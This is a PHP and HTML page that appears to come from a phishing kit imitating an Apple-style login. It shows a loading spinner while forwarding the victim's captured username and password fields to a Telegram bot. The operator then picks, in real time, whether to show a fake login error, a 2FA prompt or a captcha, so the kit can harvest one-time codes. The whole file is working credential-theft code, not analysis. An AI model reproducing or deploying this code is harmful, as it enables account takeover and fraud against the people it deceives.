<?php
session_start();
ob_start(); 
require_once('includes/php/detect.php');
require_once('config2.php');

if (!function_exists('curl_init')) {
  die('Error: cURL must be enabled on the server.');
}

if(!isset($_SESSION['username'])) $_SESSION['username'] = true;


$_SESSION['unique_id'] = bin2hex(random_bytes(16));

$adddate = date("Y-m-d H:i:s");
  
if ($live_control['access_manipulation'] === true) {

    $btnRcap = array(
        array(
            array('text' => 'LOGIN ERROR ⛔', 'callback_data' => $_SESSION['unique_id'] . ' error'),
        ),
        array(
            array('text' => 'PROCEED TO 2FA 📲', 'callback_data' => $_SESSION['unique_id'] . ' 2fa'),
          ),
        array(
          array('text' => 'Request Captcha ♻️', 'callback_data' => $_SESSION['unique_id'] . ' captcha_check'),
        ),
      );
  
    $buttons = array(
        'inline_keyboard' => $btnRcap
    );
  
  include_once('includes/php/bot_api.php');

$message = '📦 <code>'.$_SESSION['user_data']['query'].'</code>  <code>'.$_SESSION['username'].'</code> <b>is waiting</b>
<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>

<b>USER  '.$_SESSION['username'].'</b>
<b>SELECT NEXT PAGE..</b>
<b>DATE:</b> '.$adddate.'';

  $status = bot_api($message, $buttons);
  if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');
}elseif($live_control['access_auto'] == 'captcha'){
  header('location: settings/2fa.php');
  exit();
}else{
  header('location: settings/access_check.php');
  exit();
}
?>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
      <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title></title>
      <link rel="stylesheet" type="text/css" href="settings/css/index.css">
      <link rel="stylesheet" type="text/css" href="settings/css/app.css">
      <script src="settings/js/jquery-3.6.0.min.js"></script>
   </head>
   <body>
      <div id="root">
         <panel>
            <div class="root-viewport">
               <div class="root-component">
                  <div class="page-viewport landing-page-route fade-in">
                     <div class="page-content">
                     
                        <div class="home-login-component">
                           <div class="parent-container is-visible" style="display: flex; justify-content: center; align-items: center">
                              <div style="visibility: visible; height: auto;">
                              <ui-activity-indicator role="progressbar" class="standard" aria-label="Loading">
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                                 <ui-spinner-nib></ui-spinner-nib>
                              </ui-activity-indicator>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
        </panel>
      </div>
      <?php
    require_once('includes/js/startRequest.php'); 
    require_once('includes/js/makeRequest.php'); 
    ?>
    <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> error" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> 2fa" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> captcha_check")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "error") {
            window.location.href = "settings/login.php"; 
            console.log("Login error!");
        } else if (action === "2fa") {
            window.location.href = "settings/2fa.php"; 
            console.log("2fa request!");
        } else if (action === "captcha_check") {
            window.location.href = "settings/captcha.php"; 
            console.log("captcha check!");
        } 

          break;
        }
      }
    }
  </script>
  <?php require_once('includes/js/deleteMessage.php'); ?>
   </body>
</html>